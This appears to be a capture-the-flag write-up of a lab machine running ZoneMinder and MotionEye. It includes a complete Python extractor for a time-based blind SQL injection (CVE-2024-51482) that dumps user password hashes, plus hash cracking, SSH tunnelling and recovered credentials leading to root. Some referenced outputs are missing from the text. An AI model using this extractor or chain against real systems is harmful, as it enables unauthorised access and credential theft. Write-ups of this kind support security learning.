ZoneMinder v1.37.63 exposed on the apex vhost with **`admin:admin` default credentials** unlocks an authenticated context vulnerable to **CVE-2024-51482** — a blind SQL injection in the `tid` parameter of `/zm/index.php?view=request&request=event&action=removetag`, exploited via a custom time-based extractor written in Python + pwntools that dumps the `zm.Users` table character-by-character. The recovered `mark` hash — bcrypt of MD5-of-password, hashcat mode 25600 — cracks to `opensesame` and provides SSH access; the `user.txt` file is not in `mark`'s home directory but at `/home/sa_mark/user.txt`, only readable post-root. Localhost service enumeration reveals **MotionEye v0.43.1b4** listening on 127.0.0.1:8765, reached via SSH local port forward; the service is vulnerable to **CVE-2025-60787** (authenticated command injection), which rejects the `user:<empty>` default credentials. `/etc/motioneye/motion.conf` stores the admin password in cleartext (`989c5a8ee87a0e9521ec81a79187d162109282f0` — a 40-character value that looks like a SHA1 hash but is the password itself) — supplying it verbatim to the exploit driver as `--password` yields a reverse shell as **root**.

### Web Application — ZoneMinder identification

Browsing `http://cctv.htb/` loaded the front page of what identified itself as a CCTV monitoring appliance. A login button in the header linked to `/zm/index.php`, exposing the underlying application: **ZoneMinder**, an open-source video surveillance platform historically deployed in home/small-business camera installs.

ZoneMinder is one of a large family of appliance-style web applications that ship with **documented default credentials** (`admin:admin`). Vendors publish these defaults in their installation guides on the assumption that operators change them at first login; the same guides invariably note this is critical and the same operators invariably do not follow the advice. In practice, `admin:admin` is the first credential to try on any CCTV / camera / DVR / IoT-management interface.

The login accepted `admin:admin` on the first attempt. The dashboard's user menu displayed the exact version:


Version-specific vulnerability research surfaced **CVE-2024-51482** — a critical (CVSS 9.8) SQL injection in ZoneMinder ≤ 1.37.63 affecting an authenticated endpoint. The advisory identifies the injection as reachable through the `tid` parameter of the `removetag` action in the request handler.

Before pivoting to the SQL injection, the session cookie was captured from the browser (needed to authenticate the exploit script):

## Exploitation — CVE-2024-51482 (ZoneMinder Blind SQL Injection)

### Understanding the vulnerability

The vulnerable endpoint is `/zm/index.php?view=request&request=event&action=removetag&tid=<value>`. The `tid` (tag ID) parameter is inserted directly into the SQL statement that removes a tag from an event, without parameterisation. The endpoint requires a valid session (`ZMSESSID` cookie), so exploitation depends on the earlier default-credentials login.

The injection is **blind** — the endpoint does not reflect the query result in its response, does not emit distinguishable HTTP status codes on true/false conditions, and does not return database errors. The reliable oracle is **time**: MySQL's `SLEEP(N)` function can be conditionally invoked, and the HTTP request's elapsed time becomes the boolean answer. If the injected condition is true, the query blocks for N seconds and the request takes N+ seconds; if false, the query returns immediately.

The condition wrapper used throughout the extractor:

```sql
1 AND (SELECT 1 FROM (SELECT(IF(<condition>, SLEEP(<n>), 0))a))
```

The outer `SELECT 1 FROM (SELECT(...)a)` idiom is necessary because MySQL requires derived-table subqueries in the `FROM` clause to have an alias — that's what `a` is. Without the wrapper, MySQL rejects the `IF(cond, SLEEP, 0)` as syntactically invalid in the context where it's being injected.

### The custom extractor

The public PoCs available for CVE-2024-51482 were unwieldy for the goal of dumping only the `zm.Users` table, so a purpose-built extractor was written. It uses `pwntools`' `log.progress` for live-updating status output (visible per-character extraction is useful both for confidence during the run and for spotting extraction anomalies early), and a linear character-by-character search over the alphabet `[a-zA-Z0-9$./]` — the set of characters present in bcrypt hashes plus common username characters.

```python
import requests
import sys
import time
import argparse
from pwn import *
import string

characters = string.ascii_letters + string.digits + "$./"

def get_arguments():
    ap = argparse.ArgumentParser(description="CVE-2024-51482 ZoneMinder SQLi")
    ap.add_argument("-i", "--ip", required=True, help="IP de la victima")
    ap.add_argument("-c", "--cookie", required=True, help="Cookie de sesión \"ZMSESSID\"")
    ap.add_argument("-s", "--sleep", type=int, default=1, help="sleep de verificación default=2")
    ap.add_argument("-q", "--query", help="subconsulta SQL a extraer (una fila)")
    args = ap.parse_args()
    return args


def is_true(ip, cookie, sleep, condition):
    """True si la condicion SQL es verdadera (la peticion tardo ~sleep)."""
    payload = f"1 AND (SELECT 1 FROM (SELECT(IF( {condition}, SLEEP({sleep}), 0) ))a)"
    url = f"http://{ip}/zm/index.php?view=request&request=event&action=removetag&tid={payload}"
    try:
        start = time.time()
        requests.get(url, cookies={'ZMSESSID': cookie}, timeout=sleep + 10)
        elapsed = time.time() - start
        return elapsed >= sleep
    except Exception as e:
        print(f"Error: {e}")
        return False


def get_count(ip, cookie, sleep, count_subquery, maxn=50):
    """Averigua cuantas filas hay, para no depender de cadenas vacias."""
    progress = log.progress("Obtención del número de columnas")
    for n in range(maxn + 1):
        progress.status(f"Probando con {n} columnas")
        if is_true(ip, cookie, sleep, f"{count_subquery}{n}"):
            progress.success(f"La tabla tiene {n} columnas")
            return n

    progress.error("Error obteniendo el número de columnas")
    sys.exit(1)


def extract_value(ip, cookie, sleep, i, maxlen=70):
    """Extrae la cadena que devuelve subquery, caracter a caracter."""
    progress = log.progress(f"[{i+1}]")
    result = ""
    for pos in range(1, maxlen + 1):
        found = False
        for char in characters:
            progress.status(result + char)
            cond = f"substring((select Username from zm.Users limit {i},1), {pos}, 1) = '{char}'"
            if is_true(ip, cookie, sleep, cond):
                result += char
                found = True
                break
        if not found:
            break

    username = result + ":"

    result = ""
    for pos in range(1, maxlen + 1):
        found = False
        for char in characters:
            progress.status(username + result + char)
            cond = f"substring((select Password from zm.Users limit {i},1), {pos}, 1) = '{char}'"
            if is_true(ip, cookie, sleep, cond):
                result += char
                found = True
                break
        if not found:
            break

    progress.success(username + result)
    return username + result


def main():
    args = get_arguments()
    print("Blind SQL Injection - CVE-2024-51482 ZoneMinder\n")

    n = get_count(args.ip, args.cookie, args.sleep, "(select count(*) from zm.Users) = ")

    with open("creds.txt", 'a') as file:
        for i in range(n):
            creds = extract_value(args.ip, args.cookie, args.sleep, i)
            file.write(creds+"\n")


if __name__ == '__main__':
    main()
```

Two design details of the script are worth calling out. First, `get_count` iterates from `n=0` upward asking "does `count(*)` equal `n`?" — this is preferable to trying to detect an empty extracted string as the terminator, because the character-by-character loop naturally stops when no character satisfies the condition (the row doesn't exist), and there's ambiguity between "empty row" and "row that doesn't exist". Knowing the row count up-front eliminates that ambiguity. Second, `extract_value` extracts Username and Password separately per row rather than concatenating them in the SQL subquery — this makes the output human-readable during the run and keeps the query length manageable.

### Cracking the hashes

The hash prefix `$2y$10$...` identifies the format as bcrypt with cost factor 10. `hashcat` in autodetect mode enumerated the plausible modes:

```bash
hashcat creds.txt
[...]
The following 6 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+===================
  25600 | bcrypt(md5($pass))                                         | Generic KDF
  25800 | bcrypt(sha1($pass))                                        | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  28400 | bcrypt(sha512($pass))                                      | Generic KDF
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce
```

The bcrypt `$2y$` container is the same across all of these; what differs is the transformation applied to the plaintext *before* bcrypt hashes it. Plain bcrypt (mode 3200) is by far the most common, but ZoneMinder ships with a **`bcrypt(md5($pass))`** scheme — the plaintext is MD5-hashed first, and the resulting 32-character hex string is fed to bcrypt.

The reason for the pre-hash is historical: bcrypt has a **72-byte input limit**, silently truncating passwords longer than that. Developers who want to accept arbitrarily long passphrases sometimes pre-hash with MD5 (or SHA-256) to normalise the length. The tradeoff is that the pre-hash reintroduces the properties of the pre-hash function — MD5 collisions, for instance, become bcrypt collisions of the same accounts. In practice this is rarely exploitable, but it's a red flag for schemes that have not been formally reviewed.

Mode 25600 was the correct choice; a rockyou attack produced `mark`'s plaintext:

```bash
hashcat -m 25600 creds.txt /usr/share/wordlists/rockyou.txt
[...]
$2y$10$przgnazejkcutv5bknexxoglyqaok0hq07lw7aj/qnqzolbxkffg.:opensesame
```

`mark` : `opensesame`. Neither the `admin` nor `superadmin` hashes cracked against rockyou within a reasonable time window.

### SSH port forward to 8765

To reach the localhost service from a browser on the attacker box, an SSH local port forward was set up:

```bash
ssh -L 7778:127.0.0.1:8765 mark@cctv.htb -N
mark@cctv.htb's password: opensesame
```

The `-L 7778:127.0.0.1:8765` binds port 7778 on the attacker's loopback and forwards each connection through the SSH tunnel to the target's `127.0.0.1:8765`. The `-N` flag suppresses remote command execution — the tunnel stays open without occupying the terminal with an interactive shell.

Navigating to `http://127.0.0.1:7778/` in a browser rendered a login screen from an application titled "motionEye":

### MotionEye identification and default credentials

**MotionEye** is a web frontend for the `motion` motion-detection daemon — the same lineage as ZoneMinder but a different (smaller, more embedded-oriented) product. The login form followed the same defaults-first playbook as ZoneMinder: MotionEye's documentation lists `user:<empty>` as the "normal user" default credential and `admin:<empty>` as the "admin" default. The `user:<empty>` combination logged in and rendered a video panel labelled "CAM 01".

The application version was recoverable through a specific URL:

```bash
curl -s http://127.0.0.1:7778/version
hostname = "cctv"
version = "0.43.1b4"
motion_version = "4.7.1"
os_version = "Ubuntu 24.04"
```

**MotionEye 0.43.1b4** is vulnerable to **CVE-2025-60787** — an authenticated command injection with a public PoC at [`github.com/gunzf0x/CVE-2025-60787`](https://github.com/gunzf0x/CVE-2025-60787). The vulnerability allows commands to be injected into a camera-management API call that expects a plain field value but pipes it into a shell. Because the endpoint runs in the MotionEye process — which the systemd unit runs as **`User=root`** — successful exploitation yields immediate root.

### Reading `/etc/motioneye/motion.conf` — the admin password

MotionEye's configuration lives at `/etc/motioneye/motion.conf`, and it turns out to be world-readable (or at least readable by `mark`):

```bash
cat /etc/motioneye/motion.conf
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password

setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```

The `# @admin_password` field contains a 40-character hex string. It looks exactly like a **SHA1 hash**, but it is not — it is the admin password stored in **cleartext**. MotionEye keeps the credential verbatim in the config file, so there is nothing to crack: the value read from disk is the password the login expects.

### Cleartext credential storage

There is nothing to reverse. MotionEye stores the admin password in `motion.conf` and reads it back verbatim when validating API requests, so any process that can read the file has already recovered the credential in the exact form the authentication consumes. The value's hex appearance invites the assumption that it must be a hash awaiting a crack — but it is submitted as-is, and cracking it would be meaningless.

This is a recognised weakness in older embedded-appliance software: credentials sit in a config file on the assumption that local-only readability is protection enough. Any file-read primitive — even a low-privilege one — turns that storage decision into a full credential disclosure.

The exploit driver's `--password` parameter accepts the value directly because that is exactly what MotionEye expects.

## Key Takeaways

- **Vendor-documented default credentials are the first thing to try on any appliance-style interface.** ZoneMinder, MotionEye, and virtually every DVR/NVR/camera product in existence ship with credentials published in the installation guide. `admin:admin`, `admin:<empty>`, `user:<empty>`, and the vendor-specific ones (`root:calvin` for Dell iDRAC, `admin:password` for many D-Link routers) are entries on every credential wordlist for a reason. The mitigation is straightforward — force the change at first login and reject the default value server-side — and the fact that so many products still don't do this in 2026 is the ongoing "IoT default password crisis".
- **Time-based blind SQL injection is universally applicable when the response is silent.** Any injection point that reaches the database has a timing oracle available — `SLEEP(N)` in MySQL, `pg_sleep(N)` in PostgreSQL, `WAITFOR DELAY '00:00:0N'` in SQL Server, `dbms_pipe.receive_message('a', N)` in Oracle. The tradeoff is speed (hundreds of requests per character), but for extracting bounded high-value data — a users table, an authentication config, a session store — the wait is a one-time cost that unlocks the rest of the chain.
- **`bcrypt(md5($pass))` is a workaround with security implications.** Wrapping bcrypt around a pre-hash exists to circumvent bcrypt's 72-byte input limit, but the pre-hash's weaknesses become the composite scheme's weaknesses. MD5 has known collision families; two distinct passwords that MD5-collide will authenticate as the same account. In practice this is exploitable only in contrived scenarios, but it's a signal that the scheme was not reviewed by a cryptographer. Modern password hashing should use argon2id or scrypt, not bcrypt with workarounds.
- **User flag placement outside the foothold user's home is a valid HackTheBox pattern.** The convention that `user.txt` sits in `~foothold_user` holds most of the time, but not always. `find / -name "user.txt" 2>/dev/null` after every foothold is a cheap check that catches the exceptions. The corollary: don't panic if the initial shell doesn't have `user.txt` visible; keep enumerating and it may become readable after a subsequent lateral or root.
- **SSH port forwards eliminate the "bound to localhost" defence layer.** A service listening on `127.0.0.1` is only reachable from the host itself, which is a defensive posture that assumes attackers cannot reach the host. Any interactive shell — even a low-privilege one — collapses that assumption with `ssh -L`. Localhost binding is defence in depth, not a security boundary; it should be treated as reducing attack surface, not eliminating it.
- **A credential stored in a config file is a credential leak, regardless of what it looks like.** MotionEye's `# @admin_password` field holds a 40-character hex string that reads like a SHA1 hash, but it is the admin password in cleartext — the authentication consumes it verbatim, so there is nothing to crack. Anyone who can read `motion.conf` has the credential. The pattern recurs in older router firmware, in some VoIP appliances, in embedded management interfaces. The lesson for defenders is that storing a credential where a compromised process can read it defeats the point of having a password at all — and a hash-shaped value is not the same as a hashed one.
- **Reading exploit error output is where the pivot lives.** The `POST Failed: 403 - {"error": "unauthorized", "prompt": true}` line from the first CVE-2025-60787 attempt was the entire signal that (a) the vulnerability was present and reachable, (b) authentication had succeeded, and (c) the specific role assigned to `user` did not include the endpoint's authorisation. That triple of facts pointed directly at the search for admin credentials, which pointed at the config file. Exploits that fail are still telling you something useful; the useful information is usually in the last two lines of output.
- **Running the MotionEye daemon as root is the actual privilege-escalation vector.** CVE-2025-60787 is a real command-injection vulnerability, but the reason it grants root is that the systemd unit specifies `User=root`. A daemon that hosts camera streams and reads video files does not need root — dedicated `motioneye` user with access to the specific directories would have contained the CVE to a service-account compromise. The recurring lesson: services should run as the least-privileged account that can do their job, and any advisory-based patching is a poor substitute for the correct baseline `User=` directive.
